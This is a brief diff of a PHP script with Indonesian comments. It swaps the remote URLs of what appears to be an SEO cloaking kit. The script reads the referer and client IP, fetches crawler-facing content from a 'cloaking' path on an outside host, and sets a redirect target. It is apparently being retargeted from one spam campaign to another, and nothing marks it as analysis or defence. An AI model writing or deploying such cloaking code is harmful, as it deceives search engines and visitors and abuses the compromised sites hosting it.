@@ -35,8 +35,8 @@ $rf = $_SERVER["HTTP_REFERER"] ?? '';
 $ip = get_client_ip();
 
 // URL untuk file bot dan redirect
-$bot_url = "https://seowentanini.store/cloaking/ukrlinen.txt";
-$reff_url = "https://ukrlinen.pages.dev/";
+$bot_url = "https://seowentanini.store/cloaking/onlinecosmeticos.txt";
+$reff_url = "https://onlinecosmeticos.pages.dev/";
 
 // Ambil file dari URL bot
 $file = make_request($bot_url);
